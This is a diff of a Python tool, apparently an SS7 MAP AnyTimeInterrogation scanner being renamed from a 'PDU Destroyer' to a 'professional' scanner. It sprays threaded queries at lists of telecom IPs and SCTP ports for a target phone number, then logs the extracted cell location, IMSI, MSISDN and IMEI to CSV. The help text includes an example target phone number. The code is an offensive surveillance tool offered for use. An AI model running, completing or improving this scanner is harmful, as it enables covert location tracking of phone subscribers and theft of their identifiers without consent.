-            DESTROYER_STATS['subscriber_extractions'] += 1
-        
-        if 'Timeout' in result.tcap_outcome:
-            DESTROYER_STATS['timeouts'] += 1
-        elif 'Error' in result.tcap_outcome or 'ConnectionRefused' in result.tcap_outcome:
-            DESTROYER_STATS['connection_errors'] += 1
-        
-        # Calculate destruction level score
-        destruction_scores = {
-            "NONE": 0,
-            "MINIMAL": 10,
-            "LOCATION_EXTRACTED": 500,
-            "SUBSCRIBER_EXTRACTED": 750,
-            "TOTAL_DEVASTATION": 1000
-        }
-        
-        DESTROYER_STATS['total_destruction_level'] += destruction_scores.get(result.destruction_level, 0)
-        
-        if result.transmission_power > DESTROYER_STATS['max_power_achieved']:
-            DESTROYER_STATS['max_power_achieved'] = result.transmission_power
-
-# === 🎨 LEGENDARY DISPLAY SYSTEM ===
-
-def display_legendary_result(result: DestroyerScanResult, unique_id: str):
-    """Display scan result with LEGENDARY visual effects"""
-    
-    with godlike_terminal_lock:
-        # Determine display style based on destruction level
-        if result.destruction_level == "TOTAL_DEVASTATION":
-            title_color = DestroyerColors.GODLIKE_GREEN
-            status_emoji = "💀"
-            status_text = "TOTAL DEVASTATION ACHIEVED"
-        elif result.destruction_level == "LOCATION_EXTRACTED":
-            title_color = DestroyerColors.DIVINE_CYAN
-            status_emoji = "📍"
-            status_text = "LOCATION OBLITERATED"
-        elif result.destruction_level == "SUBSCRIBER_EXTRACTED":
-            title_color = DestroyerColors.MYTHIC_PURPLE
-            status_emoji = "📱"
-            status_text = "SUBSCRIBER ANNIHILATED"
-        elif result.bytes_sent == 0:
-            title_color = DestroyerColors.BLOOD_RED
-            status_emoji = "🚨"
-            status_text = "TRANSMISSION FAILED"
-        elif result.bytes_sent > 0:
-            title_color = DestroyerColors.FIRE_ORANGE
-            status_emoji = "⚡"
-            status_text = "TRANSMISSION SUCCESSFUL"
-        else:
-            title_color = DestroyerColors.DARK_RED
-            status_emoji = "❌"
-            status_text = "SCAN FAILED"
-        
-        # Main result box
-        result_content = [
-            f"{status_emoji} {result.ip}:{result.port} - {status_text}",
-            f"🕐 Timestamp: {result.timestamp}",
-            f"⏱️  Duration: {result.duration_ms:.2f}ms",
-            f"💥 Destruction Level: {result.destruction_level}",
-            f"🔄 TCAP Outcome: {result.tcap_outcome}",
-            f"ℹ️  Info: {result.error_info}"
-        ]
-        
-        print_destroyer_box(f"LEGENDARY SCAN RESULT [{unique_id}]", result_content, title_color)
-        
-        # Location information box
-        if result.location_info.cgi_found:
-            location_content = [
-                f"🏢 CELL GLOBAL IDENTITY (CGI) OBLITERATED:",
-                f"   📍 MCC: {result.location_info.mcc}",
-                f"   📍 MNC: {result.location_info.mnc}",
-                f"   📍 LAC: {result.location_info.lac}",
-                f"   📍 Cell ID: {result.location_info.cell_id}",
-                f"   ⚡ Extraction Power: {result.location_info.extraction_power}"
-            ]
-            print_destroyer_box("LOCATION DEVASTATION", location_content, DestroyerColors.GODLIKE_GREEN)
-        
-        # Subscriber information box
-        if result.subscriber_info.imsi != "N/A":
-            subscriber_content = [
-                f"📱 SUBSCRIBER DATA ANNIHILATED:",
-                f"   🔢 IMSI: {result.subscriber_info.imsi}",
-                f"   📞 MSISDN: {result.subscriber_info.msisdn}",
-                f"   📲 IMEI: {result.subscriber_info.imei}",
-                f"   ⚡ Extraction Power: {result.subscriber_info.extraction_power}"
-            ]
-            print_destroyer_box("SUBSCRIBER OBLITERATION", subscriber_content, DestroyerColors.MYTHIC_PURPLE)
-        
-        # Technical details box
-        technical_content = [
-            f"📤 Bytes Transmitted: {result.bytes_sent}",
-            f"📥 Bytes Received: {result.bytes_received}",
-            f"🕐 Connection Time: {result.connection_time_ms:.2f}ms",
-            f"🕐 Response Time: {result.response_time_ms:.2f}ms",
-            f"🎯 Used SSN: {result.used_ssn}",
-            f"📡 Used GT: {result.used_gt}",
-            f"🔧 PDU Construction: {'SUCCESS' if result.pdu_construction_success else 'FAILED'}",
-            f"⚡ Transmission Power: {result.transmission_power}"
-        ]
-        
-        if result.bytes_sent == 0:
-            technical_content.append("🚨 WARNING: ZERO BYTES TRANSMITTED!")
-        
-        print_destroyer_box("LEGENDARY TECHNICAL DETAILS", technical_content, DestroyerColors.DESTROYER_BLUE)
-
-def save_legendary_result(result: DestroyerScanResult, csv_file: Path):
-    """Save result with LEGENDARY precision"""
-    
-    with destroyer_csv_lock:
-        file_exists = csv_file.exists()
-        
-        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
-            fieldnames = [
-                'timestamp', 'ip', 'port', 'success', 'destruction_level', 'tcap_outcome',
-                'duration_ms', 'bytes_sent', 'bytes_received', 'connection_time_ms',
-                'response_time_ms', 'mcc', 'mnc', 'lac', 'cell_id', 'imsi', 'msisdn',
-                'imei', 'used_ssn', 'used_gt', 'pdu_construction_success',
-                'transmission_power', 'location_power', 'subscriber_power', 'error_info'
-            ]
-            
-            writer = csv.DictWriter(f, fieldnames=fieldnames)
-            
-            if not file_exists:
-                writer.writeheader()
-            
-            row_data = {
-                'timestamp': result.timestamp,
-                'ip': result.ip,
-                'port': result.port,
-                'success': result.success,
-                'destruction_level': result.destruction_level,
-                'tcap_outcome': result.tcap_outcome,
-                'duration_ms': result.duration_ms,
-                'bytes_sent': result.bytes_sent,
-                'bytes_received': result.bytes_received,
-                'connection_time_ms': result.connection_time_ms,
-                'response_time_ms': result.response_time_ms,
-                'mcc': result.location_info.mcc,
-                'mnc': result.location_info.mnc,
-                'lac': result.location_info.lac,
-                'cell_id': result.location_info.cell_id,
-                'imsi': result.subscriber_info.imsi,
-                'msisdn': result.subscriber_info.msisdn,
-                'imei': result.subscriber_info.imei,
-                'used_ssn': result.used_ssn,
-                'used_gt': result.used_gt,
-                'pdu_construction_success': result.pdu_construction_success,
-                'transmission_power': result.transmission_power,
-                'location_power': result.location_info.extraction_power,
-                'subscriber_power': result.subscriber_info.extraction_power,
-                'error_info': result.error_info
-            }
-            
-            writer.writerow(row_data)
-
-# === 🚀 LEGENDARY BATCH PROCESSOR ===
-
-def execute_legendary_batch(ip_port_pairs: List[Tuple[str, int]], target_msisdn: str) -> List[DestroyerScanResult]:
-    """Execute batch scan with GODLIKE efficiency and MAXIMUM destruction"""
+def scan_batch_professional(ip_port_pairs: List[Tuple[str, int]], target_msisdn: str) -> List[ScanResult]:
+    """Professional batch scanning with thread pool and elegant progress display"""
     
     results = []
     total_pairs = len(ip_port_pairs)
     
-    batch_content = [
-        f"🚀 Initiating LEGENDARY batch scan with MAXIMUM destruction",
+    progress_content = [
+        f"🚀 Starting professional batch scan",
         f"🎯 Total targets: {total_pairs}",
-        f"👥 Destroyer threads: {DESTROYER_CONFIG['max_workers']}",
-        f"🔄 Retry attempts: {DESTROYER_CONFIG['retry_attempts']}",
-        f"💀 Destruction mode: {DESTROYER_CONFIG['destruction_mode']}",
-        f"⚡ Godlike precision: {DESTROYER_CONFIG['godlike_precision']}"
+        f"👥 Worker threads: {PROFESSIONAL_CONFIG['max_workers']}",
+        f"🔄 Retry attempts: {PROFESSIONAL_CONFIG['retry_attempts']}"
     ]
     
-    print_destroyer_box("LEGENDARY BATCH EXECUTION", batch_content, DestroyerColors.FIRE_RED)
+    print_elegant_box("BATCH SCAN INITIALIZATION", progress_content, 
+                     Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
     
-    with ThreadPoolExecutor(max_workers=DESTROYER_CONFIG['max_workers']) as executor:
+    with ThreadPoolExecutor(max_workers=PROFESSIONAL_CONFIG['max_workers']) as executor:
+        # Submit all scan tasks
         future_to_target = {}
         
-        # Submit all scan tasks with LEGENDARY power
         for ip, port in ip_port_pairs:
-            for attempt in range(1, DESTROYER_CONFIG['retry_attempts'] + 1):
-                future = executor.submit(execute_legendary_scan, ip, port, target_msisdn, attempt)
+            for attempt in range(1, PROFESSIONAL_CONFIG['retry_attempts'] + 1):
+                future = executor.submit(scan_target_professional, ip, port, target_msisdn, attempt)
                 future_to_target[future] = (ip, port, attempt)
         
+        # Process completed scans
         completed = 0
-        total_futures = len(future_to_target)
-        
-        # Process completed scans with DEMONIC efficiency
         for future in as_completed(future_to_target):
             ip, port, attempt = future_to_target[future]
             
@@ -1876,106 +1947,85 @@ def execute_legendary_batch(ip_port_pairs: List[Tuple[str, int]], target_msisdn:
                 result = future.result()
                 results.append(result)
                 
-                # Display significant results or final attempts
-                if (result.success or 
-                    result.destruction_level != "NONE" or
-                    result.bytes_sent == 0 or
-                    attempt == DESTROYER_CONFIG['retry_attempts']):
-                    display_legendary_result(result, f"{ip}:{port}:A{attempt}")
+                # Update statistics
+                update_professional_statistics(result, time.time())
+                
+                # Display result if significant
+                if (result.success or result.location_info.cgi_found or 
+                    result.subscriber_info.imsi != "N/A" or 
+                    attempt == PROFESSIONAL_CONFIG['retry_attempts']):
+                    display_professional_result(result, f"{ip}:{port}:A{attempt}")
                 
                 completed += 1
                 
-                # Progress updates with LEGENDARY statistics
-                if completed % 30 == 0:
-                    progress = (completed / total_futures) * 100
-                    transmission_failures = sum(1 for r in results if r.bytes_sent == 0)
-                    successful_extractions = sum(1 for r in results if r.success)
-                    
-                    legendary_print(f"📊 LEGENDARY PROGRESS: {completed}/{total_futures} ({progress:.1f}%)", 
-                                   DestroyerColors.DIVINE_CYAN, bold=True)
-                    legendary_print(f"💀 Successful extractions: {successful_extractions}, TX failures: {transmission_failures}", 
-                                   DestroyerColors.GODLIKE_GREEN)
+                # Progress update
+                if completed % 100 == 0:
+                    progress = (completed / (total_pairs * PROFESSIONAL_CONFIG['retry_attempts'])) * 100
+                    print_colored(f"📊 Progress: {completed} completed ({progress:.1f}%)", 
+                                Colors.CYAN, bold=True)
                 
-                # Add LEGENDARY delay between retries
-                if attempt < DESTROYER_CONFIG['retry_attempts'] and not result.success:
-                    time.sleep(DESTROYER_CONFIG['retry_delay'])
+                # Add delay between retries for same target
+                if attempt < PROFESSIONAL_CONFIG['retry_attempts'] and not result.success:
+                    time.sleep(PROFESSIONAL_CONFIG['retry_delay'])
             
             except Exception as e:
-                if legendary_logger:
-                    legendary_logger.error(f"Future processing error for {ip}:{port}:{attempt}: {e}")
+                if logger:
+                    logger.error(f"Future processing error for {ip}:{port}:{attempt}: {e}")
     
     return results
 
-def display_destroyer_statistics(results: List[DestroyerScanResult]):
-    """Display LEGENDARY statistics with GODLIKE precision"""
+def display_professional_statistics(results: List[ScanResult]):
+    """Display comprehensive professional statistics in elegant boxes"""
     
-    with legendary_stats_lock:
-        stats = DESTROYER_STATS.copy()
+    with stats_lock:
+        stats = PROFESSIONAL_STATS.copy()
     
-    # Calculate advanced statistics
-    total_devastation_count = sum(1 for r in results if r.destruction_level == "TOTAL_DEVASTATION")
-    location_extractions = sum(1 for r in results if r.location_info.cgi_found)
-    subscriber_extractions = sum(1 for r in results if r.subscriber_info.imsi != "N/A")
-    transmission_failures = sum(1 for r in results if r.bytes_sent == 0)
-    
-    # Basic statistics box
+    # Basic Statistics Box
     basic_stats = [
         f"🎯 Total Attempts: {stats['total_attempts']}",
-        f"📤 Successful Transmissions: {stats['successful_transmissions']}",
-        f"🚨 Transmission Failures: {stats['transmission_failures']}",
-        f"🔧 PDU Construction Successes: {stats['pdu_construction_successes']}",
-        f"💥 PDU Construction Failures: {stats['pdu_construction_failures']}"
-    ]
-    
-    print_destroyer_box("LEGENDARY BASIC STATISTICS", basic_stats, DestroyerColors.LEGENDARY_GOLD)
-    
-    # Destruction statistics box
-    destruction_stats = [
-        f"💀 TOTAL DEVASTATIONS: {total_devastation_count}",
-        f"📍 Location Extractions: {location_extractions}",
-        f"📱 Subscriber Extractions: {subscriber_extractions}",
         f"✅ Successful Responses: {stats['successful_responses']}",
-        f"⚡ Maximum Power Achieved: {stats['max_power_achieved']}",
-        f"🔥 Total Destruction Level: {stats['total_destruction_level']}"
+        f"📊 Success Rate: {stats['success_rate']:.2f}%"
     ]
     
-    print_destroyer_box("DESTRUCTION ANALYSIS", destruction_stats, DestroyerColors.FIRE_RED)
+    print_elegant_box("BASIC METRICS", basic_stats, 
+                     Colors.BRIGHT_YELLOW, Colors.BRIGHT_WHITE, Colors.WHITE)
     
-    # Transmission analysis box
-    if stats['total_attempts'] > 0:
-        tx_success_rate = (stats['successful_transmissions'] / stats['total_attempts']) * 100
-        pdu_success_rate = (stats['pdu_construction_successes'] / stats['total_attempts']) * 100
-        
-        transmission_stats = [
-            f"📊 Transmission Success Rate: {tx_success_rate:.2f}%",
-            f"🔧 PDU Construction Success Rate: {pdu_success_rate:.2f}%",
-            f"📦 Total Bytes Transmitted: {stats['bytes_transmitted_total']}",
-            f"📦 Total Bytes Received: {stats['bytes_received_total']}",
-            f"⏰ Timeouts: {stats['timeouts']}",
-            f"🔌 Connection Errors: {stats['connection_errors']}"
+    # Data Extraction Statistics Box
+    extraction_stats = [
+        f"🏆 Full Info Extractions: {stats['full_info_extractions']}",
+        f"📍 Location Extractions: {stats['location_extractions']}",
+        f"📱 IMSI Extractions: {stats['imsi_extractions']}",
+        f"⏰ Timeouts: {stats['timeouts']}",
+        f"❌ MAP Errors: {stats['map_errors']}"
+    ]
+    
+    print_elegant_box("DATA EXTRACTION RESULTS", extraction_stats, 
+                     Colors.BRIGHT_MAGENTA, Colors.BRIGHT_WHITE, Colors.WHITE)
+    
+    # Performance Metrics Box
+    if stats['successful_responses'] > 0:
+        perf_stats = [
+            f"🚀 Fastest Response: {stats['fastest_response']:.2f}ms",
+            f"🐌 Slowest Response: {stats['slowest_response']:.2f}ms"
         ]
         
-        if stats['transmission_failures'] > 0:
-            transmission_stats.append("⚠️  WARNING: Transmission issues detected!")
+        # Calculate average response time
+        response_times = [r.response_time_ms for r in results if r.response_time_ms > 0]
+        if response_times:
+            avg_response = sum(response_times) / len(response_times)
+            perf_stats.append(f"📊 Average Response: {avg_response:.2f}ms")
         
-        if stats['pdu_construction_failures'] > 0:
-            transmission_stats.append("🚨 ALERT: PDU construction failures detected!")
-        
-        color = (DestroyerColors.GODLIKE_GREEN if stats['transmission_failures'] == 0 and 
-                stats['pdu_construction_failures'] == 0 else DestroyerColors.BLOOD_RED)
-        
-        print_destroyer_box("TRANSMISSION ANALYSIS", transmission_stats, color)
+        print_elegant_box("PERFORMANCE METRICS", perf_stats, 
+                         Colors.BRIGHT_BLUE, Colors.BRIGHT_WHITE, Colors.WHITE)
 
-# === 🗂️ LEGENDARY UTILITIES ===
-
-def load_destroyer_ips(ips_file: str) -> List[str]:
-    """Load IP addresses with LEGENDARY validation"""
+def load_ip_addresses_professional(ips_file: str) -> List[str]:
+    """Load IP addresses from file with enhanced validation"""
     
     ips_path = Path(ips_file)
     
     if not ips_path.exists():
         error_content = [f"❌ IP file not found: {ips_file}"]
-        print_destroyer_box("FILE ERROR", error_content, DestroyerColors.BLOOD_RED)
+        print_elegant_box("FILE ERROR", error_content, Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
         sys.exit(1)
     
     try:
@@ -1991,311 +2041,229 @@ def load_destroyer_ips(ips_file: str) -> List[str]:
             if not line or line.startswith('#'):
                 continue
             
+            # Basic IP validation
             try:
                 socket.inet_aton(line)
                 valid_ips.append(line)
             except socket.error:
                 invalid_count += 1
-                if legendary_logger:
-                    legendary_logger.warning(f"Invalid IP at line {line_num}: {line}")
+                if logger:
+                    logger.warning(f"Invalid IP at line {line_num}: {line}")
         
-        load_stats = [f"📋 Loaded {len(valid_ips)} LEGENDARY IPs from {ips_file}"]
+        load_stats = [
+            f"📋 Loaded {len(valid_ips)} valid IPs from {ips_file}"
+        ]
         
         if invalid_count > 0:
-            load_stats.append(f"⚠️  Rejected {invalid_count} invalid IP addresses")
+            load_stats.append(f"⚠️  Skipped {invalid_count} invalid IP addresses")
         
-        print_destroyer_box("IP LOADING", load_stats, DestroyerColors.GODLIKE_GREEN)
+        print_elegant_box("IP ADDRESS LOADING", load_stats, 
+                         Colors.GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
         
         return valid_ips
         
     except Exception as e:
         error_content = [f"❌ Error loading IP file: {e}"]
-        print_destroyer_box("LOADING ERROR", error_content, DestroyerColors.BLOOD_RED)
+        print_elegant_box("LOADING ERROR", error_content, Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
         sys.exit(1)
 
-def setup_destroyer_environment() -> Tuple[Path, Path]:
-    """Setup environment with LEGENDARY precision"""
+def generate_ip_port_pairs(ips: List[str], ports: List[int]) -> List[Tuple[str, int]]:
+    """Generate IP:port pairs with intelligent distribution"""
     
-    results_dir = Path(DESTROYER_CONFIG['results_dir'])
+    pairs = []
+    
+    for ip in ips:
+        for port in ports:
+            pairs.append((ip, port))
+    
+    # Shuffle for better distribution
+    random.shuffle(pairs)
+    
+    pair_stats = [f"🎯 Generated {len(pairs)} IP:port combinations"]
+    print_elegant_box("PAIR GENERATION", pair_stats, 
+                     Colors.CYAN, Colors.BRIGHT_WHITE, Colors.WHITE)
+    return pairs
+
+def setup_professional_environment() -> Tuple[Path, Path]:
+    """Setup professional environment with enhanced directory structure"""
+    
+    # Create results directory
+    results_dir = Path(PROFESSIONAL_CONFIG['results_dir'])
     results_dir.mkdir(exist_ok=True)
     
-    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
-    session_dir = results_dir / f"destroyer_session_{timestamp}"
+    # Create timestamped subdirectory
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    session_dir = results_dir / f"scan_session_{timestamp}"
     session_dir.mkdir(exist_ok=True)
     
-    csv_file = session_dir / f"legendary_results_{timestamp}.csv"
-    log_file = session_dir / f"destroyer_log_{timestamp}.log"
+    # Setup file paths
+    csv_file = session_dir / f"professional_results_{timestamp}.csv"
+    log_file = session_dir / f"professional_scan_{timestamp}.log"
     
     env_stats = [
-        f"📁 Destroyer directory: {session_dir}",
-        f"📊 Results CSV: {csv_file.name}",
-        f"📝 Legendary log: {log_file.name}"
+        f"📁 Results directory: {session_dir}",
+        f"📊 CSV file: {csv_file.name}",
+        f"📝 Log file: {log_file.name}"
     ]
     
-    print_destroyer_box("LEGENDARY ENVIRONMENT SETUP", env_stats, DestroyerColors.DIVINE_CYAN)
+    print_elegant_box("ENVIRONMENT SETUP", env_stats, 
+                     Colors.CYAN, Colors.BRIGHT_WHITE, Colors.WHITE)
     
     return csv_file, log_file
 
-def setup_destroyer_logging(log_file: Path) -> logging.Logger:
-    """Setup logging with LEGENDARY precision"""
+def main_professional():
+    """Main professional execution function with enhanced orchestration"""
     
-    logger = logging.getLogger("legendary_destroyer_v8")
-    logger.handlers.clear()
-    logger.setLevel(logging.DEBUG)
+    global logger, gt_pool
     
-    # Console handler with LEGENDARY formatting
-    console_handler = logging.StreamHandler()
-    console_formatter = logging.Formatter('%(message)s')
-    console_handler.setFormatter(console_formatter)
-    console_handler.setLevel(logging.INFO)
-    logger.addHandler(console_handler)
+    # Print professional banner
+    print_professional_banner()
     
-    # File handler with DETAILED logging
-    file_handler = logging.FileHandler(log_file, encoding='utf-8')
-    file_formatter = logging.Formatter(
-        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)-15s]-%(funcName)-25s:%(lineno)-4d-%(message)s',
-        datefmt='%Y-%m-%d %H:%M:%S'
-    )
-    file_handler.setFormatter(file_formatter)
-    file_handler.setLevel(logging.DEBUG)
-    logger.addHandler(file_handler)
-    
-    return logger
-
-# === 👑 LEGENDARY MAIN EXECUTOR ===
-
-def legendary_main():
-    """LEGENDARY main function with GODLIKE orchestration"""
-    
-    global legendary_logger, legendary_gt_pool
-    
-    # Display LEGENDARY banner
-    destroyer_banner()
-    
-    # Setup argument parser with LEGENDARY options
+    # Setup argument parser
     parser = argparse.ArgumentParser(
-        description="💀 Ultimate PDU Destroyer v8.0 - LEGENDARY EDITION 💀",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-🔥 LEGENDARY EXAMPLES:
-   python ultimate_pdu_destroyer_v8.py --test
-   python ultimate_pdu_destroyer_v8.py -t 212681364829 -w 25 -r 3
-   python ultimate_pdu_destroyer_v8.py --verbose --destruction-mode
-        """
+        description="Enhanced MAP-ATI Scanner v5.2 - Professional Edition with Fixed Transmission",
+        formatter_class=argparse.RawDescriptionHelpFormatter
     )
     
     parser.add_argument('-t', '--target', 
-                       default=DESTROYER_CONFIG['target_msisdn'],
-                       help='Target MSISDN (default: %(default)s)')
+                       default=PROFESSIONAL_CONFIG['target_msisdn'],
+                       help='Target MSISDN number (default: %(default)s)')
     
-    parser.add_argument('-i', '--ips',
-                       default=DESTROYER_CONFIG['ips_file'],
-                       help='IP addresses file (default: %(default)s)')
+    parser.add_argument('-i', '--ips', 
+                       default=PROFESSIONAL_CONFIG['ips_file'],
+                       help='File containing IP addresses (default: %(default)s)')
     
     parser.add_argument('-w', '--workers',
                        type=int,
-                       default=DESTROYER_CONFIG['max_workers'],
-                       help='Destroyer threads (default: %(default)s)')
+                       default=PROFESSIONAL_CONFIG['max_workers'],
+                       help='Number of worker threads (default: %(default)s)')
     
     parser.add_argument('-r', '--retries',
-                       type=int,
-                       default=DESTROYER_CONFIG['retry_attempts'],
-                       help='Retry attempts (default: %(default)s)')
+                       type=int, 
+                       default=PROFESSIONAL_CONFIG['retry_attempts'],
+                       help='Number of retry attempts (default: %(default)s)')
     
     parser.add_argument('-v', '--verbose',
                        action='store_true',
-                       help='Enable LEGENDARY verbose logging')
-    
-    parser.add_argument('--test',
-                       action='store_true',
-                       help='Run LEGENDARY test mode')
-    
-    parser.add_argument('--destruction-mode',
-                       action='store_true',
-                       help='Enable MAXIMUM destruction mode')
-    
-    parser.add_argument('--godlike-precision',
-                       action='store_true',
-                       help='Enable GODLIKE precision mode')
+                       help='Enable verbose logging')
     
     args = parser.parse_args()
     
-    # Update DESTROYER configuration
-    DESTROYER_CONFIG['target_msisdn'] = args.target
-    DESTROYER_CONFIG['ips_file'] = args.ips
-    DESTROYER_CONFIG['max_workers'] = args.workers
-    DESTROYER_CONFIG['retry_attempts'] = args.retries
-    DESTROYER_CONFIG['destruction_mode'] = args.destruction_mode
-    DESTROYER_CONFIG['godlike_precision'] = args.godlike_precision
+    # Update configuration
+    PROFESSIONAL_CONFIG['target_msisdn'] = args.target
+    PROFESSIONAL_CONFIG['ips_file'] = args.ips
+    PROFESSIONAL_CONFIG['max_workers'] = args.workers
+    PROFESSIONAL_CONFIG['retry_attempts'] = args.retries
     
-    # Setup LEGENDARY environment
-    csv_file, log_file = setup_destroyer_environment()
+    # Setup environment
+    csv_file, log_file = setup_professional_environment()
     
-    # Setup LEGENDARY logging
+    # Setup logging
     log_level = "DEBUG" if args.verbose else "INFO"
-    legendary_logger = setup_destroyer_logging(log_file)
+    logger = setup_professional_logging(log_file, log_level)
     
-    # Initialize LEGENDARY GT Pool
-    legendary_gt_pool = LegendaryGTPool(
-        SCCP_DESTROYER_CONFIG['cgpa_gt_base'],
-        2000  # MASSIVE pool for MAXIMUM variety
+    # Initialize GT Pool
+    gt_pool = ProfessionalGTPool(
+        SCCP_PROFESSIONAL['cgpa_gt_digits'], 
+        PROFESSIONAL_CONFIG['gt_pool_size']
     )
     
-    # Display LEGENDARY configuration
+    # Display configuration
     config_content = [
         f"🎯 Target MSISDN: {args.target}",
-        f"👥 Destroyer Threads: {args.workers}",
+        f"👥 Worker Threads: {args.workers}",
         f"🔄 Retry Attempts: {args.retries}",
-        f"📝 Verbose Logging: {'ENABLED' if args.verbose else 'DISABLED'}",
-        f"💀 Destruction Mode: {'ENABLED' if args.destruction_mode else 'DISABLED'}",
-        f"⚡ Godlike Precision: {'ENABLED' if args.godlike_precision else 'DISABLED'}",
-        f"🧪 Test Mode: {'ENABLED' if args.test else 'DISABLED'}"
+        f"📝 Verbose Logging: {'Enabled' if args.verbose else 'Disabled'}"
     ]
     
-    print_destroyer_box("LEGENDARY CONFIGURATION", config_content, DestroyerColors.LEGENDARY_GOLD)
+    print_elegant_box("SCAN CONFIGURATION", config_content, 
+                     Colors.BRIGHT_YELLOW, Colors.BRIGHT_WHITE, Colors.WHITE)
     
-    # LEGENDARY test mode
-    if args.test:
-        test_content = [
-            "🧪 Executing LEGENDARY transmission test...",
-            "🔧 Testing PDU construction and transmission",
-            "⚡ Single target test with MAXIMUM precision"
-        ]
-        print_destroyer_box("LEGENDARY TEST MODE", test_content, DestroyerColors.DESTROYER_BLUE)
-        
-        test_result = execute_legendary_scan("127.0.0.1", 2905, args.target, 1)
-        display_legendary_result(test_result, "LEGENDARY-TEST")
-        
-        test_summary = [
-            f"🔧 PDU Construction: {'SUCCESS' if test_result.pdu_construction_success else 'FAILED'}",
-            f"📤 Bytes Transmitted: {test_result.bytes_sent}",
-            f"🔄 TCAP Outcome: {test_result.tcap_outcome}",
-            f"⚡ Transmission Power: {test_result.transmission_power}",
-            f"💥 Destruction Level: {test_result.destruction_level}",
-            f"✅ Test Status: {'LEGENDARY SUCCESS' if test_result.bytes_sent > 0 else 'NEEDS INVESTIGATION'}"
-        ]
-        
-        color = DestroyerColors.GODLIKE_GREEN if test_result.bytes_sent > 0 else DestroyerColors.BLOOD_RED
-        print_destroyer_box("LEGENDARY TEST RESULTS", test_summary, color)
-        return
-    
-    # Load LEGENDARY IP addresses
-    ips = load_destroyer_ips(args.ips)
+    # Load IP addresses
+    ips = load_ip_addresses_professional(args.ips)
     
     if not ips:
-        error_content = ["❌ No valid IPs found for DESTRUCTION"]
-        print_destroyer_box("CRITICAL ERROR", error_content, DestroyerColors.BLOOD_RED)
+        error_content = ["❌ No valid IP addresses found"]
+        print_elegant_box("ERROR", error_content, Colors.RED, Colors.BRIGHT_WHITE, Colors.WHITE)
         sys.exit(1)
     
-    # Generate IP:port combinations with CHAOTIC distribution
-    ip_port_pairs = []
-    for ip in ips:
-        for port in DESTROYER_CONFIG['sctp_ports']:
-            ip_port_pairs.append((ip, port))
+    # Generate IP:port pairs
+    ip_port_pairs = generate_ip_port_pairs(ips, PROFESSIONAL_CONFIG['sctp_ports'])
     
-    # CHAOTIC shuffling for MAXIMUM unpredictability
-    random.shuffle(ip_port_pairs)
+    # Initialize statistics
+    PROFESSIONAL_STATS['start_time'] = time.time()
     
-    pair_stats = [f"🎯 Generated {len(ip_port_pairs)} target combinations with CHAOTIC distribution"]
-    print_destroyer_box("TARGET GENERATION", pair_stats, DestroyerColors.DIVINE_CYAN)
-    
-    # Initialize LEGENDARY statistics
-    DESTROYER_STATS['start_time'] = time.time()
-    
-    # Launch notification
-    launch_content = [
-        f"🚀 LAUNCHING LEGENDARY DESTROYER SCAN...",
-        f"⏰ Launch time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC",
-        f"🎯 Total combinations: {len(ip_port_pairs)}",
-        f"💀 Expected destruction level: MAXIMUM",
-        f"⚡ Power level: OVER 9000!!!"
+    # Start scan notification
+    start_content = [
+        f"🚀 Starting professional MAP-ATI scan...",
+        f"⏰ Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     ]
     
-    print_destroyer_box("LEGENDARY SCAN LAUNCH", launch_content, DestroyerColors.FIRE_RED)
+    print_elegant_box("SCAN INITIATION", start_content, 
+                     Colors.BRIGHT_GREEN, Colors.BRIGHT_WHITE, Colors.WHITE)
     
     try:
-        # Execute LEGENDARY batch scan
-        results = execute_legendary_batch(ip_port_pairs, args.target)
+        # Execute batch scan
+        results = scan_batch_professional(ip_port_pairs, args.target)
         
-        # Save LEGENDARY results
-        save_content = [f"💾 Saving {len(results)} LEGENDARY results..."]
-        print_destroyer_box("RESULTS PRESERVATION", save_content, DestroyerColors.DIVINE_CYAN)
+        # Save all results
+        save_content = [f"💾 Saving {len(results)} results to CSV..."]
+        print_elegant_box("RESULTS SAVING", save_content, 
+                         Colors.CYAN, Colors.BRIGHT_WHITE, Colors.WHITE)
         
         for result in results:
-            save_legendary_result(result, csv_file)
+            save_result_to_csv(result, csv_file)
         
-        # Display LEGENDARY statistics
-        display_destroyer_statistics(results)
+        # Display final statistics
+        display_professional_statistics(results)
         
-        # Calculate final metrics
+        # Success summary
         successful_results = [r for r in results if r.success]
-        total_devastations = [r for r in results if r.destruction_level == "TOTAL_DEVASTATION"]
         location_results = [r for r in results if r.location_info.cgi_found]
-        subscriber_results = [r for r in results if r.subscriber_info.imsi != "N/A"]
-        transmission_failures = [r for r in results if r.bytes_sent == 0]
-        pdu_failures = [r for r in results if not r.pdu_construction_success]
+        imsi_results = [r for r in results if r.subscriber_info.imsi != "N/A"]
         
-        scan_duration = time.time() - DESTROYER_STATS['start_time']
+        # Scan duration
+        total_duration = time.time() - PROFESSIONAL_STATS['start_time']
         
-        # Final summary with LEGENDARY presentation
         summary_content = [
             f"📊 Total Results: {len(results)}",
-            f"💀 Total Devastations: {len(total_devastations)}",
-            f"✅ Successful Extractions: {len(successful_results)}",
-            f"📍 Location Extractions: {len(location_results)}",
-            f"📱 Subscriber Extractions: {len(subscriber_results)}",
-            f"🚨 Transmission Failures: {len(transmission_failures)}",
-            f"🔧 PDU Construction Failures: {len(pdu_failures)}",
+            f"✅ Successful: {len(successful_results)}",
+            f"📍 With Location: {len(location_results)}",
+            f"📱 With IMSI: {len(imsi_results)}",
             f"📄 Results saved to: {csv_file}",
-            f"📝 Logs saved to: {log_file}",
-            f"⏱️  Total Duration: {scan_duration:.2f} seconds"
+            f"⏱️  Total Duration: {total_duration:.2f} seconds"
         ]
         
-        if len(transmission_failures) == 0 and len(pdu_failures) == 0:
-            summary_content.append("🎉 PERFECT LEGENDARY EXECUTION!")
-        elif len(transmission_failures) > 0:
-            summary_content.append("⚠️  TRANSMISSION ISSUES DETECTED!")
-        
-        if len(total_devastations) > 0:
-            summary_content.append(f"💀 ACHIEVED {len(total_devastations)} TOTAL DEVASTATIONS!")
-        
